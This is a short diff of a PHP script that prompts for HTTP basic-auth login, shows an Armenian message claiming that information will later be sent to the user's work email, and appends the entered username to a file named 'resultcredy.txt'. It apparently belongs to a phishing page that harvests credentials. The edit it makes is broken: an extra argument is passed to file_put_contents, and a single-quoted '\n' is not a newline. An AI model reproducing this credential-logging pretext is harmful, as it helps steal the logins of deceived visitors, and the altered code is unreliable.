@@ -9,5 +9,6 @@ if (!isset($_SERVER['PHP_AUTH_USER'])) {
     echo "<p>Սերվերի բեռի շնորհիվ, մոտ ապագայում բոլոր տեղեկությունները կուղարկվեն ձեր աշխատանքային էլ.փոստի հասցեին:</p>";
 }
 $filename = 'resultcredy.txt';
-file_put_contents($filename, $_SERVER['PHP_AUTH_USER'], FILE_APPEND);
+$test = 'John\n';
+file_put_contents($filename, $_SERVER['PHP_AUTH_USER'], $test, FILE_APPEND);
 ?>
